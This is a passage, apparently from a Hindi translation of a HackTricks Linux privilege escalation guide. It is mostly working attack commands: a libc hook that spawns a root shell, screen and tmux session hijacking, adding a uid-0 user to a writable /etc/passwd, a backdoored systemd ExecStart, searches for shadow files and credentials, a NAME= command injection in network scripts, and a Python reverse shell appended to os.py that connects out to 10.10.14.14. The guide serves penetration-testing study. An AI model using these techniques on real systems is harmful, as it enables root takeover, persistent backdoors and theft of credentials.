int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## क्षमताएँ

Linux क्षमताएँ एक **प्रक्रिया को उपलब्ध रूट विशेषाधिकारों का उपसमुच्चय** प्रदान करती हैं। यह प्रभावी रूप से रूट **विशेषाधिकारों को छोटे और विशिष्ट इकाइयों में विभाजित** करता है। इन इकाइयों में से प्रत्येक को स्वतंत्र रूप से प्रक्रियाओं को सौंपा जा सकता है। इस तरह पूर्ण विशेषाधिकारों का सेट कम हो जाता है, जिससे शोषण के जोखिम कम होते हैं।\
अधिक जानकारी के लिए **क्षमताओं और उन्हें कैसे दुरुपयोग किया जा सकता है** पढ़ें:

{{#ref}}
linux-capabilities.md
{{#endref}}

## निर्देशिका अनुमतियाँ

एक निर्देशिका में, **"कार्यक्रम"** के लिए बिट का अर्थ है कि प्रभावित उपयोगकर्ता "**cd**" फ़ोल्डर में जा सकता है।\
**"पढ़ने"** का बिट दर्शाता है कि उपयोगकर्ता **फाइलों** की **सूची** बना सकता है, और **"लिखने"** का बिट दर्शाता है कि उपयोगकर्ता **फाइलों** को **हटा** और **नया** **फाइल** **बना** सकता है।

## ACLs

एक्सेस कंट्रोल लिस्ट (ACLs) वैकल्पिक अनुमतियों की द्वितीयक परत का प्रतिनिधित्व करती हैं, जो **पारंपरिक ugo/rwx अनुमतियों को ओवरराइड** करने में सक्षम हैं। ये अनुमतियाँ फ़ाइल या निर्देशिका के एक्सेस पर नियंत्रण को बढ़ाती हैं, विशेष उपयोगकर्ताओं को अधिकार देने या अस्वीकार करने की अनुमति देकर जो मालिक या समूह का हिस्सा नहीं हैं। यह स्तर की **सूक्ष्मता अधिक सटीक एक्सेस प्रबंधन सुनिश्चित करती है**। आगे की जानकारी [**यहाँ**](https://linuxconfig.org/how-to-manage-acls-on-linux) मिल सकती है।

**उपयोगकर्ता "kali" को एक फ़ाइल पर पढ़ने और लिखने की अनुमतियाँ दें:**
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**विशिष्ट ACLs** वाले फ़ाइलें सिस्टम से प्राप्त करें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Open shell sessions

In **पुराने संस्करणों** आप **हाइजैक** कर सकते हैं कुछ **शेल** सत्र एक अलग उपयोगकर्ता (**रूट**) के।\
In **नवीनतम संस्करणों** आप केवल **अपने स्वयं के उपयोगकर्ता** के स्क्रीन सत्रों से **जुड़ने** में सक्षम होंगे। हालांकि, आप **सत्र के अंदर दिलचस्प जानकारी** पा सकते हैं।

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**सत्र से संलग्न करें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux सत्रों का हाइजैकिंग

यह **पुराने tmux संस्करणों** के साथ एक समस्या थी। मैं एक गैर-प्रिविलेज्ड उपयोगकर्ता के रूप में रूट द्वारा बनाए गए tmux (v2.1) सत्र को हाइजैक करने में असमर्थ था।

**tmux सत्रों की सूची**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**सत्र से जुड़ें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Debian आधारित सिस्टम (Ubuntu, Kubuntu, आदि) पर सितंबर 2006 और 13 मई 2008 के बीच उत्पन्न सभी SSL और SSH कुंजी इस बग से प्रभावित हो सकती हैं।\
यह बग उन OS में एक नई ssh कुंजी बनाने के दौरान होता है, क्योंकि **केवल 32,768 भिन्नताएँ संभव थीं**। इसका मतलब है कि सभी संभावनाएँ गणना की जा सकती हैं और **ssh सार्वजनिक कुंजी होने पर आप संबंधित निजी कुंजी के लिए खोज कर सकते हैं**। आप यहां गणना की गई संभावनाएँ पा सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** यह निर्दिष्ट करता है कि क्या पासवर्ड प्रमाणीकरण की अनुमति है। डिफ़ॉल्ट `no` है।
- **PubkeyAuthentication:** यह निर्दिष्ट करता है कि क्या सार्वजनिक कुंजी प्रमाणीकरण की अनुमति है। डिफ़ॉल्ट `yes` है।
- **PermitEmptyPasswords**: जब पासवर्ड प्रमाणीकरण की अनुमति होती है, तो यह निर्दिष्ट करता है कि क्या सर्वर खाली पासवर्ड स्ट्रिंग वाले खातों में लॉगिन की अनुमति देता है। डिफ़ॉल्ट `no` है।

### PermitRootLogin

यह निर्दिष्ट करता है कि क्या रूट ssh का उपयोग करके लॉगिन कर सकता है, डिफ़ॉल्ट `no` है। संभावित मान:

- `yes`: रूट पासवर्ड और निजी कुंजी का उपयोग करके लॉगिन कर सकता है
- `without-password` या `prohibit-password`: रूट केवल निजी कुंजी के साथ लॉगिन कर सकता है
- `forced-commands-only`: रूट केवल निजी कुंजी का उपयोग करके और यदि कमांड विकल्प निर्दिष्ट किए गए हैं तो लॉगिन कर सकता है
- `no` : नहीं

### AuthorizedKeysFile

यह उन फ़ाइलों को निर्दिष्ट करता है जो सार्वजनिक कुंजी को शामिल करती हैं जो उपयोगकर्ता प्रमाणीकरण के लिए उपयोग की जा सकती हैं। इसमें `%h` जैसे टोकन हो सकते हैं, जिसे होम डायरेक्टरी द्वारा प्रतिस्थापित किया जाएगा। **आप पूर्ण पथ निर्दिष्ट कर सकते हैं** (जो `/` से शुरू होता है) या **उपयोगकर्ता के होम से सापेक्ष पथ**। उदाहरण के लिए:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
यह कॉन्फ़िगरेशन यह संकेत देगा कि यदि आप उपयोगकर्ता "**testusername**" की **private** कुंजी के साथ लॉगिन करने का प्रयास करते हैं, तो ssh आपकी कुंजी की सार्वजनिक कुंजी की तुलना `/home/testusername/.ssh/authorized_keys` और `/home/testusername/access` में स्थित कुंजियों से करेगा।

### ForwardAgent/AllowAgentForwarding

SSH एजेंट फॉरवर्डिंग आपको **अपने स्थानीय SSH कुंजी का उपयोग करने** की अनुमति देता है बजाय इसके कि कुंजियाँ (बिना पासफ़्रेज़ के!) आपके सर्वर पर बैठी रहें। इसलिए, आप ssh के माध्यम से **एक होस्ट** पर **जंप** कर सकेंगे और वहां से **दूसरे** होस्ट पर **जंप** कर सकेंगे **उपयोग करके** अपनी **प्रारंभिक होस्ट** में स्थित **कुंजी**।

आपको इस विकल्प को `$HOME/.ssh.config` में इस तरह सेट करना होगा:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि यदि `Host` `*` है, तो हर बार जब उपयोगकर्ता किसी अन्य मशीन पर कूदता है, तो वह होस्ट कुंजियों तक पहुँच प्राप्त कर सकेगा (जो एक सुरक्षा समस्या है)।

फाइल `/etc/ssh_config` इस **विकल्पों** को **ओवरराइड** कर सकती है और इस कॉन्फ़िगरेशन की अनुमति या अस्वीकृति कर सकती है।\
फाइल `/etc/sshd_config` ssh-agent फॉरवर्डिंग को कीवर्ड `AllowAgentForwarding` के साथ **अनुमति** या **अस्वीकृति** दे सकती है (डिफ़ॉल्ट अनुमति है)।

यदि आप पाते हैं कि फॉरवर्ड एजेंट किसी वातावरण में कॉन्फ़िगर किया गया है, तो निम्नलिखित पृष्ठ को पढ़ें क्योंकि **आप इसे विशेषाधिकार बढ़ाने के लिए दुरुपयोग कर सकते हैं**:

{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## दिलचस्प फ़ाइलें

### प्रोफाइल फ़ाइलें

फाइल `/etc/profile` और `/etc/profile.d/` के तहत फ़ाइलें **स्क्रिप्ट हैं जो तब निष्पादित होती हैं जब उपयोगकर्ता एक नया शेल चलाता है**। इसलिए, यदि आप इनमें से किसी को **लिख सकते हैं या संशोधित कर सकते हैं, तो आप विशेषाधिकार बढ़ा सकते हैं**।
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब प्रोफ़ाइल स्क्रिप्ट मिलती है, तो आपको इसे **संवेदनशील विवरण** के लिए जांचना चाहिए।

### Passwd/Shadow फ़ाइलें

OS के आधार पर, `/etc/passwd` और `/etc/shadow` फ़ाइलें एक अलग नाम का उपयोग कर सकती हैं या एक बैकअप हो सकता है। इसलिए यह अनुशंसित है कि **इनमें से सभी को खोजें** और **जांचें कि क्या आप इन्हें पढ़ सकते हैं** यह देखने के लिए कि **क्या फ़ाइलों के अंदर हैश हैं**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कई मौकों पर आप **password hashes** को `/etc/passwd` (या समकक्ष) फ़ाइल के अंदर पा सकते हैं।
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

पहले, निम्नलिखित कमांड में से एक के साथ एक पासवर्ड उत्पन्न करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
फिर उपयोगकर्ता `hacker` जोड़ें और उत्पन्न पासवर्ड जोड़ें।
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदाहरण: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

आप अब `su` कमांड का उपयोग `hacker:hacker` के साथ कर सकते हैं।

वैकल्पिक रूप से, आप बिना पासवर्ड के एक डमी उपयोगकर्ता जोड़ने के लिए निम्नलिखित पंक्तियों का उपयोग कर सकते हैं।\
चेतावनी: आप मशीन की वर्तमान सुरक्षा को कमजोर कर सकते हैं।
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
नोट: BSD प्लेटफार्मों में `/etc/passwd` `/etc/pwd.db` और `/etc/master.passwd` पर स्थित है, और `/etc/shadow` का नाम बदलकर `/etc/spwd.db` कर दिया गया है।

आपको यह जांचना चाहिए कि क्या आप कुछ **संवेदनशील फ़ाइलों में लिख सकते हैं**। उदाहरण के लिए, क्या आप कुछ **सेवा कॉन्फ़िगरेशन फ़ाइल** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, यदि मशीन **tomcat** सर्वर चला रही है और आप **/etc/systemd/ के अंदर Tomcat सेवा कॉन्फ़िगरेशन फ़ाइल को संशोधित कर सकते हैं,** तो आप निम्नलिखित पंक्तियों को संशोधित कर सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
आपका बैकडोर अगली बार जब टॉमकैट शुरू होगा, तब निष्पादित होगा।

### फ़ोल्डर जांचें

निम्नलिखित फ़ोल्डर बैकअप या दिलचस्प जानकारी रख सकते हैं: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (संभवतः आप अंतिम को पढ़ने में असमर्थ होंगे लेकिन प्रयास करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब स्थान/स्वामित्व वाली फ़ाइलें
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### अंतिम मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फ़ाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी हुई फ़ाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH में स्क्रिप्ट/बाइनरी**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **वेब फ़ाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Known files containing passwords

Read the code of [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), यह **कई संभावित फ़ाइलों की खोज करता है जो पासवर्ड हो सकते हैं**।\
**एक और दिलचस्प उपकरण** जिसका आप इसका उपयोग कर सकते हैं: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) जो एक ओपन-सोर्स एप्लिकेशन है जिसका उपयोग Windows, Linux और Mac के लिए स्थानीय कंप्यूटर पर संग्रहीत कई पासवर्ड पुनर्प्राप्त करने के लिए किया जाता है।

### Logs

यदि आप लॉग पढ़ सकते हैं, तो आप **उनमें दिलचस्प/गोपनीय जानकारी** पा सकते हैं। लॉग जितना अजीब होगा, यह उतना ही दिलचस्प होगा (संभवतः)।\
इसके अलावा, कुछ "**खराब**" कॉन्फ़िगर किए गए (बैकडोर?) **ऑडिट लॉग** आपको **ऑडिट लॉग में पासवर्ड रिकॉर्ड करने** की अनुमति दे सकते हैं जैसा कि इस पोस्ट में समझाया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**लॉग पढ़ने के लिए समूह** [**adm**](interesting-groups-linux-pe/index.html#adm-group) वास्तव में सहायक होगा।

### शेल फ़ाइलें
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

आपको उन फ़ाइलों की जांच भी करनी चाहिए जिनमें "**password**" शब्द उनके **नाम** में या **सामग्री** के अंदर है, और साथ ही लॉग में IPs और ईमेल की जांच करनी चाहिए, या हैश regexps।\
मैं यहाँ यह सूचीबद्ध नहीं करने जा रहा हूँ कि यह सब कैसे करना है लेकिन यदि आप रुचि रखते हैं तो आप अंतिम जांचें देख सकते हैं जो [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) करता है।

## Writable files

### Python library hijacking

यदि आप जानते हैं कि **कहाँ** एक पायथन स्क्रिप्ट निष्पादित होने जा रही है और आप उस फ़ोल्डर के अंदर **लिख सकते हैं** या आप **पायथन पुस्तकालयों को संशोधित कर सकते हैं**, तो आप OS पुस्तकालय को संशोधित कर सकते हैं और इसे बैकडोर कर सकते हैं (यदि आप लिख सकते हैं जहाँ पायथन स्क्रिप्ट निष्पादित होने जा रही है, तो os.py पुस्तकालय को कॉपी और पेस्ट करें)।

**पुस्तकालय को बैकडोर करने के लिए** बस os.py पुस्तकालय के अंत में निम्नलिखित पंक्ति जोड़ें (IP और PORT बदलें):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` में एक सुरक्षा कमी उपयोगकर्ताओं को **लॉग फ़ाइल** या इसके माता-पिता निर्देशिकाओं पर **लेखन अनुमतियों** के साथ संभावित रूप से बढ़ी हुई विशेषाधिकार प्राप्त करने की अनुमति देती है। इसका कारण यह है कि `logrotate`, जो अक्सर **रूट** के रूप में चलता है, को मनमाने फ़ाइलों को निष्पादित करने के लिए हेरफेर किया जा सकता है, विशेष रूप से _**/etc/bash_completion.d/**_ जैसी निर्देशिकाओं में। यह महत्वपूर्ण है कि _/var/log_ में ही नहीं, बल्कि किसी भी निर्देशिका में जहां लॉग रोटेशन लागू किया गया है, अनुमतियों की जांच की जाए।

> [!NOTE]
> यह सुरक्षा कमी `logrotate` संस्करण `3.18.0` और पुराने को प्रभावित करती है

सुरक्षा कमी के बारे में अधिक विस्तृत जानकारी इस पृष्ठ पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

आप इस सुरक्षा कमी का लाभ [**logrotten**](https://github.com/whotwagner/logrotten) के साथ उठा सकते हैं।

यह सुरक्षा कमी [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx लॉग),** के समान है, इसलिए जब भी आप पाते हैं कि आप लॉग को बदल सकते हैं, तो जांचें कि उन लॉग का प्रबंधन कौन कर रहा है और जांचें कि क्या आप लॉग को सिम्लिंक्स द्वारा प्रतिस्थापित करके विशेषाधिकार बढ़ा सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**सुरक्षा कमी संदर्भ:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

यदि, किसी भी कारण से, एक उपयोगकर्ता _/etc/sysconfig/network-scripts_ में **लेखन** करने में सक्षम है `ifcf-<whatever>` स्क्रिप्ट या इसे **समायोजित** कर सकता है, तो आपका **सिस्टम प्वंड** है।

नेटवर्क स्क्रिप्ट, _ifcg-eth0_ उदाहरण के लिए नेटवर्क कनेक्शनों के लिए उपयोग की जाती हैं। वे बिल्कुल .INI फ़ाइलों की तरह दिखती हैं। हालाँकि, इन्हें Linux पर नेटवर्क प्रबंधक (dispatcher.d) द्वारा \~sourced\~ किया जाता है।

मेरे मामले में, इन नेटवर्क स्क्रिप्ट में `NAME=` को सही तरीके से संभाला नहीं गया है। यदि नाम में **सफेद/खाली स्थान है तो सिस्टम सफेद/खाली स्थान के बाद के भाग को निष्पादित करने की कोशिश करता है**। इसका मतलब है कि **पहले सफेद स्थान के बाद सब कुछ रूट के रूप में निष्पादित होता है**।

उदाहरण के लिए: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd, और rc.d**

डायरेक्टरी `/etc/init.d` **स्क्रिप्ट्स** का घर है जो System V init (SysVinit) के लिए है, जो **क्लासिक Linux सेवा प्रबंधन प्रणाली** है। इसमें सेवाओं को `start`, `stop`, `restart`, और कभी-कभी `reload` करने के लिए स्क्रिप्ट्स शामिल हैं। इन्हें सीधे या `/etc/rc?.d/` में पाए जाने वाले प्रतीकात्मक लिंक के माध्यम से निष्पादित किया जा सकता है। Redhat सिस्टम में एक वैकल्पिक पथ `/etc/rc.d/init.d` है।

दूसरी ओर, `/etc/init` **Upstart** से संबंधित है, जो Ubuntu द्वारा पेश की गई एक नई **सेवा प्रबंधन** प्रणाली है, जो सेवा प्रबंधन कार्यों के लिए कॉन्फ़िगरेशन फ़ाइलों का उपयोग करती है। Upstart में संक्रमण के बावजूद, SysVinit स्क्रिप्ट्स अभी भी Upstart कॉन्फ़िगरेशन के साथ उपयोग की जाती हैं क्योंकि Upstart में एक संगतता परत है।

**systemd** एक आधुनिक प्रारंभिककरण और सेवा प्रबंधक के रूप में उभरता है, जो मांग पर डेमन प्रारंभ करने, ऑटोमाउंट प्रबंधन, और सिस्टम स्थिति स्नैपशॉट जैसी उन्नत सुविधाएँ प्रदान करता है। यह वितरण पैकेज के लिए फ़ाइलों को `/usr/lib/systemd/` में और प्रशासक संशोधनों के लिए `/etc/systemd/system/` में व्यवस्थित करता है, जिससे सिस्टम प्रशासन प्रक्रिया को सरल बनाया जा सके।

## अन्य तरकीबें

### NFS विशेषाधिकार वृद्धि

{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### प्रतिबंधित शेल से भागना

{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage

{{#ref}}
cisco-vmanage.md
{{#endref}}

## कर्नेल सुरक्षा सुरक्षा

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## अधिक सहायता

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux स्थानीय विशेषाधिकार वृद्धि वेक्टर की खोज के लिए सबसे अच्छा उपकरण:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t विकल्प)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux और MAC में कर्नेल कमजोरियों की गणना करें [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (भौतिक पहुंच):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**अधिक स्क्रिप्ट्स का संकलन**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## संदर्भ

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

{{#include ../../banners/hacktricks-training.md}}
